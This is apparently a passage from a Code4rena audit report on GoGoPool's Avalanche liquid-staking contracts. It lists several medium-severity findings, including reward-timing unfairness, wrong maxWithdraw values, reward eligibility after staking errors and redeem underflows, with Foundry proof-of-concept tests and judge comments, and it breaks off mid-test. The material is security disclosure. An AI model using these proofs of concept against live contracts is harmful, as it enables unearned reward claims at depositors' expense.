*Submitted by [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/478), also found by [Bnke0x0](https://github.com/code-423n4/2022-12-gogopool-findings/issues/863), [joestakey](https://github.com/code-423n4/2022-12-gogopool-findings/issues/835), [0xNazgul](https://github.com/code-423n4/2022-12-gogopool-findings/issues/812), [Breeje](https://github.com/code-423n4/2022-12-gogopool-findings/issues/796), [IllIllI](https://github.com/code-423n4/2022-12-gogopool-findings/issues/731), [IllIllI](https://github.com/code-423n4/2022-12-gogopool-findings/issues/730), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-gogopool-findings/issues/655), [kiki\_dev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/506), [koxuan](https://github.com/code-423n4/2022-12-gogopool-findings/issues/445), [fs0c](https://github.com/code-423n4/2022-12-gogopool-findings/issues/380), [ck](https://github.com/code-423n4/2022-12-gogopool-findings/issues/376), [btk](https://github.com/code-423n4/2022-12-gogopool-findings/issues/361), [csanuragjain](https://github.com/code-423n4/2022-12-gogopool-findings/issues/310), [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/180), [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/154), [0x73696d616f](https://github.com/code-423n4/2022-12-gogopool-findings/issues/134), and [Rolezn](https://github.com/code-423n4/2022-12-gogopool-findings/issues/99)*

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L88-L109><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166-L178><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L180-L189>

Function `syncRewards()` distributes rewards to TokenggAVAX holders, it linearly distribute cycle's rewards from `block.timestamp` to the cycle end time which is next multiple of the `rewardsCycleLength` (the end time of the cycle is defined and the real duration of the cycle changes). when a cycle ends `syncRewards()` should be called so the next cycle starts but if `syncRewards()` doesn't get called fast, then users depositing or withdrawing funds before call to `syncRewards()` would lose their rewards and those rewards would go to users who deposited funds after `syncRewards()` call. contract should try to start the next cycle whenever deposit or withdraw happens to make sure rewards are distributed fairly between users.

### Proof of Concept

This is `syncRewards()` code:

    	function syncRewards() public {
    		uint32 timestamp = block.timestamp.safeCastTo32();

    		if (timestamp < rewardsCycleEnd) {
    			revert SyncError();
    		}

    		uint192 lastRewardsAmt_ = lastRewardsAmt;
    		uint256 totalReleasedAssets_ = totalReleasedAssets;
    		uint256 stakingTotalAssets_ = stakingTotalAssets;

    		uint256 nextRewardsAmt = (asset.balanceOf(address(this)) + stakingTotalAssets_) - totalReleasedAssets_ - lastRewardsAmt_;

    		// Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.
    		uint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;

    		lastRewardsAmt = nextRewardsAmt.safeCastTo192();
    		lastSync = timestamp;
    		rewardsCycleEnd = nextRewardsCycleEnd;
    		totalReleasedAssets = totalReleasedAssets_ + lastRewardsAmt_;
    		emit NewRewardsCycle(nextRewardsCycleEnd, nextRewardsAmt);
    	}

As you can see whenever this function is called it starts the new cycle and sets the end of the cycle to the next multiple of the `rewardsCycleLength` and it release the rewards linearly between current timestamp and cycle end time. So if `syncRewards()` get called near to multiple of the `rewardsCycleLength` then rewards would be distributed with higher speed in less time. The problem is that users depositing funds before call `syncRewards()` won't receive new cycles rewards and early depositing won't get considered in reward distribution if deposits happen before `syncRewards()` call and if a user withdraws his funds before the `syncRewards()` call then he receives no rewards.

Imagine this scenario:

1.  `rewardsCycleLength` is 10 days and the rewards for the next cycle is `100` AVAX.
2.  the last cycle has been ended and user1 has `10000` AVAX deposited and has 50% of the pool shares.
3.  `syncRewards()` don't get called for 8 days.
4.  users1 withdraws his funds receive `10000` AVAX even so he deposits for 8 days in the current cycle.
5.  users2 deposit `1000` AVAX and get 10% of pool shares and the user2 would call `syncRewards()` and contract would start distributing `100` avax as reward.
6.  after 2 days cycle would finish and user2 would receive `100 * 10% = 10` AVAX as rewards for his `1000` AVAX deposit for 2 days but user1 had `10000` AVAX for 8 days and would receive 0 rewards.

So rewards won't distribute fairly between depositors across the time and any user interacting with contract before the `syncRewards()` call can lose his rewards. Contract won't consider deposit amounts and duration before `syncRewards()` call and it won't make sure that `syncRewards()` logic would be executed as early as possible with deposit or withdraw calls when a cycle ends.

### Tools Used

VIM

### Recommended Mitigation Steps

One way to solve this is to call `syncRewards()` logic in each deposit or withdraw and make sure that cycles start as early as possible (the revert "SyncError()" in the `syncRewards()` should be removed for this).


**[emersoncloud (GoGoPool) disagreed with severity and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/478#issuecomment-1382098984):**
 > I think that medium severity is more appropriate. User funds aren't drained or lost, but liquid staking rewards may be unfairly calculated. 
> 
> Good find. I think there is something we could do to either incentivize the `syncRewards` call or call it on deposit and withdraw. 
> 
> But I disagree with the concept that the user who staked for 8 days is entitled to rewards for staking. Rewards depend on properly running minipools. Reward amounts can fluctuate depending on the utilization of liquid staking funds by minipools. 

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/478#issuecomment-1401657682):**
 > After some more discussion, this is working as designed. And Rialto will call `syncRewards` at the start of each reward cycle, so the possible loss to the user who withdraws before `syncRewards` was supposed to be called is mitigated.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/478#issuecomment-1415624850):**
 > The Warden has shown a potential risk for end-users that withdraw before `syncRewards` is called.
> 
> Because the finding pertains to a loss of yield, I believe the finding to be of Medium Severity.
> 
> While Rialto may call this as a perfect actor, we cannot guarantee that a end user could forfeit some amount of yield, due to external conditions.
> 
> I believe this finding to potentially be a nofix, as long as all participants are aware of the mechanic.
> 
> Per discussions had on [\#99](https://github.com/code-423n4/2022-12-gogopool-findings/issues/99), I don't believe that any specific MEV attack has been identified, however this finding does highlight a potential risk that a mistimed withdrawal could cause.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/478#issuecomment-1421430629):**
 > Acknowledged.
> 
> Not fixing but will add a note in our docs.



***

## [[M-16] `maxWithdraw()` and `maxRedeem()` doesn't return correct value which can make other contracts fail while working with protocol](https://github.com/code-423n4/2022-12-gogopool-findings/issues/476)
*Submitted by [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/476)*

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L215-L223><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L205-L213>

Functions `maxWithdraw()` and `maxRedeem()` returns max amount of assets or shares owner would be able to withdraw taking into account liquidity in the TokenggAVAX contract, but logics don't consider that when user withdraws the withdrawal amounts subtracted from `totalReleasedAssets` (in `beforeWithdraw()` function) so the maximum amounts that can user withdraws should always be lower than `totalReleasedAssets` (which shows all the deposits and withdraws) but because functions `maxWithdraw()` and `maxRedeem()` uses `totalAssets()` to calculate available AVAX which includes deposits and current cycle rewards so those functions would return wrong value (whenever the return value is bigger than `totalReleaseAssets` then it would be wrong).

### Proof of Concept

This is `beforeWithdraw()` code:

    	function beforeWithdraw(
    		uint256 amount,
    		uint256 /* shares */
    	) internal override {
    		totalReleasedAssets -= amount;
    	}

This is `beforeWithdraw()` code which is called whenever users withdraws their funds and as you can see the amount of withdrawal assets subtracted from `totalReleaseAssets` so withdrawal amounts can never be bigger than `totalReleaseAssets`. This is `maxWithdraw()` code:

    	function maxWithdraw(address _owner) public view override returns (uint256) {
    		if (getBool(keccak256(abi.encodePacked("contract.paused", "TokenggAVAX")))) {
    			return 0;
    		}
    		uint256 assets = convertToAssets(balanceOf[_owner]);
    		uint256 avail = totalAssets() - stakingTotalAssets;
    		return assets > avail ? avail : assets;
    	}

As you can see to calculate available AVAX in the contract address code uses `totalAssets() - stakingTotalAssets` and `totalAssets()` shows deposits + current cycle rewards so `totalAssets()` is bigger than `totalReleaseAssets` and the value of the `totalAssets() - stakingTotalAssets` can be bigger than `totalReleaseAssets` and if code returns `avail` as answer then the return value would be wrong.

Imagine this scenario:

1.  `totalReleaseAssets` is `10000` AVAX.
2.  `stakingTotalAssets` is `1000` AVAX.
3.  current cycle rewards is `4000` AVAX and `block.timestamp` is currently in the middle of the cycle so current rewards is `2000` AVAX.
4.  `totalAssets()` is `totalReleaseAssets + current rewards = 10000 + 2000 = 12000`.
5.  contract balance is `10000 + 4000 - 1000 = 13000` AVAX.
6.  user1 has 90% contract shares and calls `maxWithdraw()` and code would calculate user assets as `10800` AVAX and available AVAX in contract as `totalAssets() - stakingTotalAssets = 12000 - 1000 = 11000` and code would return `10800` as answer.
7.  now if user1 withdraws `10800` AVAX code would revert in the function `beforeWithdraw()` because code would try to execute `totalReleaseAssets = totalReleaseAssets - amount = 10000 - 10800` and it would revert because of the underflow. so in reality user1 couldn't withdraw `10800` AVAX which was the return value of the `maxWithdraw()` for user1.

The root cause of the bug is that the withdrawal amount is subtracted from `totalReleaseAssets` and so max withdrawal can never be `totalReleaseAssets` and function `maxWithdraw()` should never return value bigger than `totalReleaseAssets`. (the bug in function `maxRedeem()` is similar)

This bug would cause other contract or front end calls to fail, for example if the logic is something like this:

       amount = maxWithdraw(user);
       TokenggAVAX.withdrawAVAX(amount);

According the function definitions this code should work bug because of the the issue there are situations that this would revert and other contracts and UI can't work properly with the protocol.

### Tools Used

VIM

### Recommended Mitigation Steps

Consider `totalReleaseAssets` in max withdrawal amount too.

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/476)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/476#issuecomment-1412684720):**
 > The Warden has shown an inconsistency between the view functions and the actual behaviour of `TokenggAVAX`.<br>
> This breaks ERC4626, as well as offering subpar experience for end-users.
> 
> For this reason I agree with Medium Severity.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/476#issuecomment-1421431600):**
 > Acknowledged.
> 
> I've added some tests to explore this more, but it's a known issue with how we've implemented the streaming of rewards in our 4626. Some more context here https://github.com/fei-protocol/ERC4626/issues/24.
> 
> It's most prevalent with low liquidity in ggAVAX. 
> 
> We're not going to fix in the first iteration of protocol.



***

## [[M-17] NodeOp can get rewards even if there was an error in registering the node as a validator](https://github.com/code-423n4/2022-12-gogopool-findings/issues/471)
*Submitted by [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/471), also found by [datapunk](https://github.com/code-423n4/2022-12-gogopool-findings/issues/829), [hansfriese](https://github.com/code-423n4/2022-12-gogopool-findings/issues/570), [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/469), [cccz](https://github.com/code-423n4/2022-12-gogopool-findings/issues/327), and [cozzetti](https://github.com/code-423n4/2022-12-gogopool-findings/issues/192)*

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L56><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L89>

The [documentation](https://multisiglabs.notion.site/Architecture-Protocol-Overview-4b79e351133f4d959a65a15478ec0121) says that the NodeOps could be elegible for GGP rewards if they have a valid minipool. The problem is that if the MiniPool [has an error](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484) while registering the node as a validator, the NodeOp can get rewards even if the minipool had an error.

When the Rialto calls `recordStakingError()` function the `AssignedHighWater` is not reseted. So the malicious NodeOp (staker) can create pools which will have an error in the registration and get rewards from the protocol.

### Proof of Concept

I created a test in `ClaimNodeOp.t.sol`:

1.  NodeOp1 creates minipool
2.  Rialto calls claimAndInitiateStaking, recordStakingStart and recordStakingError()
3.  NodeOp1 withdraw his funds from minipool
4.  NodeOp1 can get rewards even if there was an error with the node registration as validator.

```solidity
function testRecordStakingErrorCanGetRewards() public {
    // NodeOp can get rewards even if there was an error in registering the node as a validator
    // 1. NodeOp1 creates minipool
    // 2. Rialot/multisig claimAndInitiateStaking, recordStakingStart and recordStakingError
    // 3. NodeOp1 withdraw his funds from minipool
    // 4. NodeOp1 can get rewards even if there was an error with the node registration as validator.
    address nodeOp1 = getActorWithTokens("nodeOp1", MAX_AMT, MAX_AMT);
    uint256 duration = 2 weeks;
    uint256 depositAmt = 1000 ether;
    uint256 avaxAssignmentRequest = 1000 ether;
    skip(dao.getRewardsCycleSeconds());
    rewardsPool.startRewardsCycle();
    //
    // 1. NodeOp1 creates minipool
    //
    vm.startPrank(nodeOp1);
    ggp.approve(address(staking), MAX_AMT);
    staking.stakeGGP(200 ether);
    MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
    vm.stopPrank();
    address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
    vm.prank(liqStaker1);
    ggAVAX.depositAVAX{value: MAX_AMT}();
    //
    // 2. Rialto/multisig claimAndInitiateStaking, recordStakingStart and recordStakingError
    //
    vm.prank(address(rialto));
    minipoolMgr.claimAndInitiateStaking(mp1.nodeID);
    bytes32 txID = keccak256("txid");
    vm.prank(address(rialto));
    minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);
    bytes32 errorCode = "INVALID_NODEID";
    int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);
    skip(2 weeks);
    vm.prank(address(rialto));
    minipoolMgr.recordStakingError{value: depositAmt + avaxAssignmentRequest}(mp1.nodeID, errorCode);
    assertEq(vault.balanceOf("MinipoolManager"), depositAmt);
    MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);
    assertEq(mp1Updated.avaxTotalRewardAmt, 0);
    assertEq(mp1Updated.errorCode, errorCode);
    assertEq(mp1Updated.avaxNodeOpRewardAmt, 0);
    assertEq(mp1Updated.avaxLiquidStakerRewardAmt, 0);
    assertEq(minipoolMgr.getTotalAVAXLiquidStakerAmt(), 0);
    assertEq(staking.getAVAXAssigned(mp1Updated.owner), 0);
    // The highwater doesnt get reset in this case
    assertEq(staking.getAVAXAssignedHighWater(mp1Updated.owner), depositAmt);
    //
    // 3. NodeOp1 withdraw his funds from the minipool
    //
    vm.startPrank(nodeOp1);
    uint256 priorBalance_nodeOp = nodeOp1.balance;
    minipoolMgr.withdrawMinipoolFunds(mp1.nodeID);
    assertEq((nodeOp1.balance - priorBalance_nodeOp), depositAmt);
    vm.stopPrank();
    //
    // 4. NodeOp1 can get rewards even if there was an error with the node registration as validator.
    //
    skip(2629756);
    vm.startPrank(address(rialto));
    assertTrue(nopClaim.isEligible(nodeOp1)); //<- The NodeOp1 is eligible for rewards
    nopClaim.calculateAndDistributeRewards(nodeOp1, 200 ether);
    vm.stopPrank();
    assertGt(staking.getGGPRewards(nodeOp1), 0);
    vm.startPrank(address(nodeOp1));
    nopClaim.claimAndRestake(staking.getGGPRewards(nodeOp1)); //<- Claim nodeOp1 rewards
    vm.stopPrank();
}
```

### Tools used

Foundry/VsCode

### Recommended Mitigation Steps

The `MinipoolManager.sol::recordStakingError()` function should reset the Assigned high water `staking.resetAVAXAssignedHighWater(stakerAddr);` so the user can not claim rewards for a minipool with errors.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1382233034):**
 > Good find. This is unique in terms of calling out `avaxAssignedHighWater` but I'm going to link other issues dealing with `recordStakingError` 
> 
> https://github.com/code-423n4/2022-12-gogopool-findings/issues/819

**[emersoncloud (GoGoPool) disagreed with severity and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1382233406):**
 > Since this is not a leak of funds in the protocol but GGP rewards instead, I think a medium designation is more appropriate

**[0xju1ie (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1397195132):**
 > So the warden is incorrect about the order of events that should happen, the correct order is the following:
> 1. NodeOp1 creates minipool
> 2. Rialto calls `claimAndInitiateStaking()`
> 3. Rialto calls `recordStakingStart()` if the staking with avalanche was successful. If it was not, Rialto will call `recordStakingError()`. So Rialto will never be calling both of these functions, it is one or the other.
> 
> `avaxAssignedHighWater` is only changed in `recordStakingStart()`, so not sure we would want to reset it in `recordStakingError()`.
> 
> Questioning the validity of the issue.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1398365148):**
 > The key issue is that a minipool won't ever go from `Staking` to `Error` state. It's currently allowed in our state machine but it's not a situation that can happen on the Avalanche network and something we'll fix. In that way it depends on Rialto making a mistake to transition the minipool from staking to error. 
> 
> I think pointing out the issue in our state machine is valid and QA level.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/471#issuecomment-1415584261):**
 > The Warden has highlighted an issue with the FSM of the system.
> 
> While Rialto is assumed as a perfect actor, the code allows calling `recordStakingStart` and then `recordStakingError`.
> 
> This state transition is legal, however will cause issues, such as setting `avaxAssignedHighWater` to a higher value than intended, which could allow the staker to be entitled to rewards.
> 
> Because the State Transition will not happen in reality (per the Scope Requirements), am downgrading the finding to Medium Severity and believe the State Transition Check should be added to offer operators and end users a higher degree of on-chain guarantees.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Remove the state transition from Staking to Error: [multisig-labs/gogopool#28](https://github.com/multisig-labs/gogopool/pull/28)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/58) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/42).



***

## [[M-18] Users may not be able to redeem their shares due to underflow](https://github.com/code-423n4/2022-12-gogopool-findings/issues/317)
*Submitted by [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/317), also found by [datapunk](undefined), [Franfran](https://github.com/code-423n4/2022-12-gogopool-findings/issues/778), [Breeje](https://github.com/code-423n4/2022-12-gogopool-findings/issues/758), [IllIllI](https://github.com/code-423n4/2022-12-gogopool-findings/issues/732), [Matin](https://github.com/code-423n4/2022-12-gogopool-findings/issues/598), [SmartSek](https://github.com/code-423n4/2022-12-gogopool-findings/issues/593), [nadin](https://github.com/code-423n4/2022-12-gogopool-findings/issues/520), [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/461), [fs0c](https://github.com/code-423n4/2022-12-gogopool-findings/issues/378), [btk](https://github.com/code-423n4/2022-12-gogopool-findings/issues/340), [ck](https://github.com/code-423n4/2022-12-gogopool-findings/issues/289), [0xdeadbeef0x](https://github.com/code-423n4/2022-12-gogopool-findings/issues/210), [0xdeadbeef0x](https://github.com/code-423n4/2022-12-gogopool-findings/issues/208), [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/176), and [Rolezn](https://github.com/code-423n4/2022-12-gogopool-findings/issues/98)*

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L191><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L88>

The `totalReleasedAssets` variable is updated on the [syncRewards()](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L88) function if someone calls the function before `rewardsCycleEnd` the [redeemAVAX()](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L191) will be reverted because the `totalReleasedAssets` may not include all the rewards.

The ggAvax holder can not redeem his funds until the `rewardsCycleEnd`.

### Proof of Concept

I did the next test:

1.  Create minipool (2000 avax)
2.  Deposit rewards to the minipool (200 AVAX rewards)
3.  Sync the rewards before the cycle ends
4.  Redeem function will revert
5.  Redeem will be available after the cycle end

```solidity
function testRedeemUnderOverFlow() public {
    // Redeem function reverts arithmetic error
    // 1.- Create minipool
    // 2.- Deposit rewards to the minipool
    // 3.- Sync the Rewards before the cycle end
    // 4.- Redeem function will revert
    // 5.- Redeem will be available after the cycle end.
    // Deposit liquid staker funds
    uint256 depositAmount = 1200 ether;
    uint256 nodeAmt = 2000 ether;
    uint128 ggpStakeAmt = 200 ether;
    vm.deal(bob, depositAmount);
    vm.prank(bob);
    ggAVAX.depositAVAX{value: depositAmount}();//Avax deposit 1200
    //
    // 1.- Create minipool
    //
    address nodeOp = getActorWithTokens("nodeOp", uint128(depositAmount), ggpStakeAmt);
    // Nodeop stake GGP and create minipoool
    vm.startPrank(nodeOp);
    ggp.approve(address(staking), ggpStakeAmt);
    staking.stakeGGP(ggpStakeAmt);
    MinipoolManager.Minipool memory mp = createMinipool(nodeAmt / 2, nodeAmt / 2, duration);
    vm.stopPrank();
    // Rialto init recordStakingStart
    vm.startPrank(address(rialto));
    minipoolMgr.claimAndInitiateStaking(mp.nodeID);
    minipoolMgr.recordStakingStart(mp.nodeID, randHash(), block.timestamp);
    vm.stopPrank();
    skip(mp.duration);
    //
    // 2.- Deposit rewards to the minipool
    //
    uint256 rewardsAmt = nodeAmt.mulDivDown(0.1 ether, 1 ether);
    console.log("Rewards amount:", rewardsAmt / 1 ether);
    vm.deal(address(rialto), address(rialto).balance + rewardsAmt);
    vm.prank(address(rialto));
    minipoolMgr.recordStakingEnd{value: nodeAmt + rewardsAmt}(mp.nodeID, block.timestamp, rewardsAmt);
    //
    // 3.- Sync the Rewards before the cycle end
    //
    ggAVAX.syncRewards();
    uint256 maxRedeemSharesBob = ggAVAX.maxRedeem(bob);
    console.log("TotalReleasedAssets after syncRewards:", ggAVAX.totalReleasedAssets() / 1 ether);
    console.log("LastRewards after syncRewards:", ggAVAX.lastRewardsAmt() / 1 ether);
    console.log("Bob maxRedeem():", maxRedeemSharesBob / 1 ether);
    //
    // 4.- Redeem function will revert
    //
    skip(1 days);
    console.log("Bob PreviewRedeem() after skip one day:", ggAVAX.previewRedeem(maxRedeemSharesBob) / 1 ether);
    vm.prank(bob);
    vm.expectRevert(stdError.arithmeticError); // Revert by arithmetic error
    ggAVAX.redeemAVAX(maxRedeemSharesBob);
    //
    // 5.- Redeem will be available after the cycle end.
    //
    skip(ggAVAX.rewardsCycleLength() + 1 days);
    ggAVAX.syncRewards();
    maxRedeemSharesBob = ggAVAX.maxRedeem(bob);
    console.log("");
    console.log("TotalReleasedAssets after syncRewards:", ggAVAX.totalReleasedAssets() / 1 ether);
    console.log("LastRewards after syncRewards:", ggAVAX.lastRewardsAmt() / 1 ether);
    console.log("Bob maxRedeem():", maxRedeemSharesBob / 1 ether);
    console.log("Bob PreviewRedeem() after skip to the cycle end:", ggAVAX.previewRedeem(maxRedeemSharesBob) / 1 ether);
    vm.prank(bob);
    ggAVAX.redeemAVAX(maxRedeemSharesBob);
}
```

Output:

    [PASS] testRedeemUnderOverFlow() (gas: 1244356)
    Logs:
      Rewards amount: 200
      TotalReleasedAssets after syncRewards: 1200
      LastRewards after syncRewards: 85
      Bob maxRedeem(): 1200
      Bob PreviewRedeem() after skip one day: 1206
      
      TotalReleasedAssets after syncRewards: 1285
      LastRewards after syncRewards: 0
      Bob maxRedeem(): 1200
      Bob PreviewRedeem() after skip to the cycle end: 1285

### Tools used

Foundry/VsCode

### Recommended Mitigation Steps

Consider redeem the max available amount for the shares owner instead of revert. The `maxRedeem()` function amount is not the same as the `previewRedeem()` amount.

**[emersoncloud (GoGoPool) acknowledged and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/317#issuecomment-1385070739):**
 > This is a known issue that we don't intend to fix. The issue is most likely to present itself at the very start of the ggAVAX and not during typical operation. There's a bit more explanation here: https://github.com/fei-protocol/ERC4626/issues/24
> 
> I don't believe redeeming max available is an appropriate solution because the spec for redeem reads
> 
> > MUST revert if all of shares cannot be redeemed (due to withdrawal limit being reached, slippage, the owner not having enough shares, etc).

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/317#issuecomment-1409217179):**
 > The Warden has shown a scenario in which `maxRedeem` can revert.
> 
> While this can be attributed to rounding errors, it ultimately is possible for certain depositors to lose marginal amounts of their rewards or principal.
> 
> Because of the reduced impact, I agree with Medium Severity.
> 
> This is a hedge case that has been argued to have happened very rarely, and for this reason, I maintain that the severity is Medium, but can agree with a nofix, as the worst case will require the Sponsor to offer a small amount of additional token, to allow the last withdrawer to maxRedeem.



***

## [[M-19] MinipoolManager: `recordStakingError` function does not decrease `minipoolCount` leading to too high GGP rewards for staker](https://github.com/code-423n4/2022-12-gogopool-findings/issues/235)
*Submitted by [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/235), also found by [Aymen0909](https://github.com/code-423n4/2022-12-gogopool-findings/issues/870), [minhtrng](https://github.com/code-423n4/2022-12-gogopool-findings/issues/861), [adriro](https://github.com/code-423n4/2022-12-gogopool-findings/issues/763), [sces60107](https://github.com/code-423n4/2022-12-gogopool-findings/issues/666), [wagmi](https://github.com/code-423n4/2022-12-gogopool-findings/issues/644), [sk8erboy](https://github.com/code-423n4/2022-12-gogopool-findings/issues/603), [SmartSek](https://github.com/code-423n4/2022-12-gogopool-findings/issues/590), [bin2chen](https://github.com/code-423n4/2022-12-gogopool-findings/issues/511), [Allarious](https://github.com/code-423n4/2022-12-gogopool-findings/issues/504), [cccz](https://github.com/code-423n4/2022-12-gogopool-findings/issues/326), [kaliberpoziomka8552](https://github.com/code-423n4/2022-12-gogopool-findings/issues/274), [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/253), and [Saintcode\_](https://github.com/code-423n4/2022-12-gogopool-findings/issues/188)*

The `MinipoolManager.recordStakingError` function (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515>) does not decrease the `minipoolCount` of the staker.

This means that if a staker has a minipool that encounters an error, his `minipoolCount` can never go to zero again.

This is bad because the `minipoolCount` is used in `ClaimNodeOp.calculateAndDistributeRewards` to determine if the `rewardsStartTime` of the staker should be reset (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L81-L84>).

Since the `minipoolCount` cannot go to zero, the `rewardsStartTime` will never be reset.

This means that the staker is immediately eligible for rewards when he creates a minipool again whereas he should have to wait `rewardsEligibilityMinSeconds` before he is eligible (which is 14 days at the moment) (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L51>).

To conclude, failing to decrease the `minipoolCount` allows the staker to earn higher rewards because he is eligible for staking right after he creates a new minipool and does not have to wait again.

### Proof of Concept

I have created the following test that you can add to the `MinipoolManager.t.sol` file that logs the `minipoolCount` in the `Staking`, `Error` and `Finished` state.

The `minipoolCount` is always `1` although it should decrease to `0` when `recordStakingError` is called.

```solidity
function testRecordStakingErrorWrongMinipoolCount() public {
    uint256 duration = 2 weeks;
    uint256 depositAmt = 1000 ether;
    uint256 avaxAssignmentRequest = 1000 ether;
    uint256 validationAmt = depositAmt + avaxAssignmentRequest;
    uint128 ggpStakeAmt = 200 ether;

    vm.startPrank(nodeOp);
    ggp.approve(address(staking), MAX_AMT);
    staking.stakeGGP(ggpStakeAmt);
    MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
    vm.stopPrank();

    address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
    vm.prank(liqStaker1);
    ggAVAX.depositAVAX{value: MAX_AMT}();

    vm.prank(address(rialto));
    minipoolMgr.claimAndInitiateStaking(mp1.nodeID);

    bytes32 txID = keccak256("txid");
    vm.prank(address(rialto));
    minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

    bytes32 errorCode = "INVALID_NODEID";

    int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);

    vm.prank(nodeOp);
    // minipool count when in "Staking" state: 1
    console.log(staking.getMinipoolCount(nodeOp));
    vm.prank(address(rialto));
    minipoolMgr.recordStakingError{value: validationAmt}(mp1.nodeID, errorCode);
    vm.prank(nodeOp);
    // minipool count when in "Error" state: 1
    console.log(staking.getMinipoolCount(nodeOp));

    vm.prank(address(rialto));

    assertEq(vault.balanceOf("MinipoolManager"), depositAmt);

    MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);

    vm.prank(address(rialto));
    minipoolMgr.finishFailedMinipoolByMultisig(mp1Updated.nodeID);
    MinipoolManager.Minipool memory mp1finished = minipoolMgr.getMinipool(minipoolIndex);
    vm.prank(nodeOp);
    // minipool count when in "Finished" state: 1
